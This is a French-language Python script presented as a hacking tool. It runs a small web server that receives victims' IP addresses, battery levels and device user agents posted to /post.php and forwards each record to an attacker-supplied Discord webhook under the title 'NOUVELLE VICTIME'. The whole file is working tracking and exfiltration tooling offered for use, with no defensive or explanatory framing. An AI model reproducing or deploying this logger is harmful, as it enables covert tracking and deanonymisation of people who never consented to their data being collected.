import http.server
import socketserver
import json
import urllib.request
import os

os.system("clear")
print("\033[31m  G . O . D   E D I T I O N\033[0m")
print("-" * 30)
print("\033[33m LA PIRATERIE C'EST JAMAIS FINI\033[0m")
print("-" * 30)

WEBHOOK_URL = input("\033[32m[+]\033[0m Entre ton Webhook Discord : ").strip()

class PirateHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/post.php':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                payload = {
                    "username": "LOGGER-GOD",
                    "embeds": [{
                        "title": "🔍 NOUVELLE VICTIME",
                        "color": 15158332,
                        "fields": [
                            {"name": "📍 IP", "value": data.get('ip', 'N/A'), "inline": True},
                            {"name": "🔋 Batterie", "value": f"{data.get('batt', 'N/A')}%", "inline": True},
                            {"name": "📱 Appareil", "value": data.get('ua', 'N/A')}
                        ]
                    }]
                }
                req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode('utf-8'), headers={'Content-Type': 'application/json'})
                urllib.request.urlopen(req)
            except Exception as e: print(f"Erreur: {e}")
            self.send_response(200)
            self.end_headers()

with socketserver.TCPServer(("", 8080), PirateHandler) as httpd:
    print("\033[36m[*]\033[0m Serveur actif sur le port 8080...")
    httpd.serve_forever()
